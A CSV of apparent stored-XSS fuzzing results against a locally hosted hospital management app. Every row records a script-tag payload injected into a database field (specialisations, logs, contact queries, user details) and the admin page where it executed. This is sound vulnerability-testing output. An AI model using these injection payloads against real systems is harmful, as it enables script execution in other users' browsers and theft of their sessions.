hospital,doctorspecilization.specilization,"http://localhost/hospital/hms/admin/doctor-specilization.php
http://localhost/hospital/hms/admin/doctor-specilization.php#
http://localhost/hospital/hms/admin/edit-doctor-specialization.php?id=1",984774,"""'><script>xss(984774)</script>","
            hms.doctorspecilization.specilization[0][1]
            original row: [1, 'Orthopedics', datetime.datetime(2022, 10, 30, 18, 9, 46), None]
            fuzzed row: [1, '""\'><script>xss(984774)</script>', datetime.datetime(2022, 10, 30, 18, 9, 46), None]
            change: 'Orthopedics' => '""'><script>xss(984774)</script>'
            
fuzzed after scan 14 / 41
found as XSS in scan 15 / 41"
hospital,doctorspecilization.specilization,"http://localhost/hospital/hms/admin/doctor-specilization.php
http://localhost/hospital/hms/admin/doctor-specilization.php#",985620,"""'><script>xss(985620)</script>","
            hms.doctorspecilization.specilization[12][1]
            original row: [13, 'Dermatologists', datetime.datetime(2022, 10, 30, 18, 12, 2), None]
            fuzzed row: [13, '""\'><script>xss(985620)</script>', datetime.datetime(2022, 10, 30, 18, 12, 2), None]
            change: 'Dermatologists' => '""'><script>xss(985620)</script>'
            
fuzzed after scan 14 / 41
found as XSS in scan 15 / 41"
hospital,userlog.logout,"http://localhost/hospital/hms/admin/user-logs.php
http://localhost/hospital/hms/admin/user-logs.php#",986904,"""'><script>xss(986904)</script>","
            hms.userlog.logout[4][5]
            original row: [5, 1, 'johndoe12@test.com', bytearray(b'192.168.144.1\x00\x00\x00'), datetime.datetime(2023, 3, 6, 7, 32, 14), '06-03-2023 01:02:22 PM', 1]
            fuzzed row: [5, 1, 'johndoe12@test.com', bytearray(b'192.168.144.1\x00\x00\x00'), datetime.datetime(2023, 3, 6, 7, 32, 14), '""\'><script>xss(986904)</script>', 1]
            change: '06-03-2023 01:02:22 PM' => '""'><script>xss(986904)</script>'
            
fuzzed after scan 35 / 41
found as XSS in scan 36 / 41"
hospital,doctorspecilization.specilization,"http://localhost/hospital/hms/admin/doctor-specilization.php
http://localhost/hospital/hms/admin/doctor-specilization.php#
http://localhost/hospital/hms/admin/edit-doctor-specialization.php?id=2",987071,"""'><script>xss(987071)</script>","
            hms.doctorspecilization.specilization[1][1]
            original row: [2, 'Internal Medicine', datetime.datetime(2022, 10, 30, 18, 9, 57), None]
            fuzzed row: [2, '""\'><script>xss(987071)</script>', datetime.datetime(2022, 10, 30, 18, 9, 57), None]
            change: 'Internal Medicine' => '""'><script>xss(987071)</script>'
            
fuzzed after scan 14 / 41
found as XSS in scan 15 / 41"
hospital,doctorslog.username,"http://localhost/hospital/hms/admin/doctor-logs.php
http://localhost/hospital/hms/admin/doctor-logs.php#",987624,"""'><script>xss(987624)</script>","
            hms.doctorslog.username[0][2]
            original row: [20, None, 'gfdgdf', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 4, 1, 2, 16), None, 0]
            fuzzed row: [20, None, '""\'><script>xss(987624)</script>', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 4, 1, 2, 16), None, 0]
            change: 'gfdgdf' => '""'><script>xss(987624)</script>'
            
fuzzed after scan 12 / 41
found as XSS in scan 13 / 41"
hospital,tblcontactus.fullname,"http://localhost/hospital/hms/admin/query-details.php?id=1
http://localhost/hospital/hms/admin/unread-queries.php
http://localhost/hospital/hms/admin/unread-queries.php#",988638,"""'><script>xss(988638)</script>","
            hms.tblcontactus.fullname[0][1]
            original row: [1, 'Anuj kumar', 'anujk30@test.com', 1425362514, 'This is for testing purposes.   This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.', datetime.datetime(2022, 10, 30, 16, 52, 3), None, None, None]
            fuzzed row: [1, '""\'><script>xss(988638)</script>', 'anujk30@test.com', 1425362514, 'This is for testing purposes.   This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.', datetime.datetime(2022, 10, 30, 16, 52, 3), None, None, None]
            change: 'Anuj kumar' => '""'><script>xss(988638)</script>'
            
fuzzed after scan 15 / 41
found as XSS in scan 16 / 41"
hospital,users.gender,"http://localhost/hospital/hms/admin/manage-users.php
http://localhost/hospital/hms/admin/manage-users.php#",992864,"""'><script>xss(992864)</script>","
            hms.users.gender[0][4]
            original row: [1, 'John Doe', 'A 123 ABC Apartment GZB 201017', 'Ghaziabad', 'male', 'johndoe12@test.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 6, 12, 13, 56), None]
            fuzzed row: [1, 'John Doe', 'A 123 ABC Apartment GZB 201017', 'Ghaziabad', '""\'><script>xss(992864)</script>', 'johndoe12@test.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 6, 12, 13, 56), None]
            change: 'male' => '""'><script>xss(992864)</script>'
            
fuzzed after scan 39 / 41
found as XSS in scan 40 / 41"
hospital,tblcontactus.message,"http://localhost/hospital/hms/admin/query-details.php?id=1
http://localhost/hospital/hms/admin/unread-queries.php
http://localhost/hospital/hms/admin/unread-queries.php#",993257,"""'><script>xss(993257)</script>","
            hms.tblcontactus.message[0][4]
            original row: [1, 'Anuj kumar', 'anujk30@test.com', 1425362514, 'This is for testing purposes.   This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.', datetime.datetime(2022, 10, 30, 16, 52, 3), None, None, None]
            fuzzed row: [1, 'Anuj kumar', 'anujk30@test.com', 1425362514, '""\'><script>xss(993257)</script>', datetime.datetime(2022, 10, 30, 16, 52, 3), None, None, None]
            change: 'This is for testing purposes.   This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.' => '""'><script>xss(993257)</script>'
            
fuzzed after scan 17 / 41
found as XSS in scan 18 / 41"
hospital,doctorslog.logout,"http://localhost/hospital/hms/admin/doctor-logs.php
http://localhost/hospital/hms/admin/doctor-logs.php#",993388,"""'><script>xss(993388)</script>","
            hms.doctorslog.logout[6][5]
            original row: [26, 1, 'anujk123@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 13, 17, 33), '06-11-2022 06:50:28 PM', 1]
            fuzzed row: [26, 1, 'anujk123@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 13, 17, 33), '""\'><script>xss(993388)</script>', 1]
            change: '06-11-2022 06:50:28 PM' => '""'><script>xss(993388)</script>'
            
fuzzed after scan 13 / 41
found as XSS in scan 14 / 41"
hospital,users.city,"http://localhost/hospital/hms/admin/manage-users.php
http://localhost/hospital/hms/admin/manage-users.php#",994609,"""'><script>xss(994609)</script>","
            hms.users.city[1][3]
            original row: [2, 'Amit kumar', 'new Delhi india', 'New Delhi', 'male', 'amitk@gmail.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 6, 13, 15, 32), None]
            fuzzed row: [2, 'Amit kumar', 'new Delhi india', '""\'><script>xss(994609)</script>', 'male', 'amitk@gmail.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 6, 13, 15, 32), None]
            change: 'New Delhi' => '""'><script>xss(994609)</script>'
            
fuzzed after scan 38 / 41
found as XSS in scan 39 / 41"
hospital,doctorspecilization.specilization,"http://localhost/hospital/hms/admin/doctor-specilization.php
http://localhost/hospital/hms/admin/doctor-specilization.php#",995639,"""'><script>xss(995639)</script>","
            hms.doctorspecilization.specilization[2][1]
            original row: [3, 'Obstetrics and Gynecology', datetime.datetime(2022, 10, 30, 18, 10, 18), None]
            fuzzed row: [3, '""\'><script>xss(995639)</script>', datetime.datetime(2022, 10, 30, 18, 10, 18), None]
            change: 'Obstetrics and Gynecology' => '""'><script>xss(995639)</script>'
            
fuzzed after scan 14 / 41
found as XSS in scan 15 / 41"
hospital,userlog.logout,"http://localhost/hospital/hms/admin/user-logs.php
http://localhost/hospital/hms/admin/user-logs.php#",996734,"""'><script>xss(996734)</script>","
            hms.userlog.logout[0][5]
            original row: [1, 1, 'johndoe12@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 12, 14, 11), None, 1]
            fuzzed row: [1, 1, 'johndoe12@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 12, 14, 11), '""\'><script>xss(996734)</script>', 1]
            change: 'None' => '""'><script>xss(996734)</script>'
            
fuzzed after scan 35 / 41
found as XSS in scan 36 / 41"
hospital,users.email,"http://localhost/hospital/hms/admin/manage-users.php
http://localhost/hospital/hms/admin/manage-users.php#",998132,"""'><script>xss(998132)</script>","
            hms.users.email[1][5]
            original row: [2, 'Amit kumar', 'new Delhi india', 'New Delhi', 'male', 'amitk@gmail.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 6, 13, 15, 32), None]
            fuzzed row: [2, 'Amit kumar', 'new Delhi india', 'New Delhi', 'male', '""\'><script>xss(998132)</script>', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 6, 13, 15, 32), None]
            change: 'amitk@gmail.com' => '""'><script>xss(998132)</script>'
            
fuzzed after scan 40 / 41
found as XSS in scan 41 / 41"
